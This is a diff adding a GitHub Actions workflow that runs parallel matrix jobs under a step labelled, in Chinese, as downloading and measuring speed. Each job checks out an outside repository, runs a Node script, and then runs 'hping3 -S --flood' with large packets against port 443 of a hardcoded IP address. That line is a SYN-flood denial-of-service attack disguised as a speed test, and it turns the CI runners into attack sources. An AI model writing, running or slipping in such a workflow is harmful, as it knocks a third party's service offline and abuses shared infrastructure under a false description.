@@ -1,0 +1,61 @@
+on:
+  push:
+    # paths:
+    #   - '.github/workflows/download.yml'
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  TZ: Asia/Shanghai
+  TASK_COUNT: 320
+
+jobs:
+  prepare-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      ids: ${{ steps.set-matrix.outputs.ids }}
+      matrix_ready_at: ${{ steps.set-matrix.outputs.matrix_ready_at }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: set-matrix
+        run: |
+          count=5
+          ids=$(jq -c -n --argjson n "$count" '[range(1; $n+1)]')
+          # 输出 matrix 启动准备完成的时间
+          matrix_ready_at=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+          echo "ids=$ids" >> $GITHUB_OUTPUT
+          echo "matrix_ready_at=$matrix_ready_at" >> $GITHUB_OUTPUT
+
+  concurrent-jobs:
+    needs: prepare-matrix
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        job_id: ${{ fromJson(needs.prepare-matrix.outputs.ids) }}
+    steps:
+      - name: 检查队列等待时间
+        run: |
+          MATRIX_READY_AT="${{ needs.prepare-matrix.outputs.matrix_ready_at }}"
+          QUEUE_TIME=$(( $(date -u +%s) - $(date -d "$MATRIX_READY_AT" +%s) ))
+          echo "Queue time since matrix ready: $QUEUE_TIME seconds"
+          if [ "$QUEUE_TIME" -gt 180 ]; then
+            echo "::error::Queue time since matrix ready exceeded 180 seconds."
+            exit 1
+          fi
+
+      - uses: actions/checkout@v4
+        with:
+          repository: mirllan2025/express
+
+      - id: run-speed
+        name: 下载并统计速度
+        run: |
+          yarn
+          timeout 600s node index.js --count ${{env.TASK_COUNT}}
+          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.239.16.131 || true
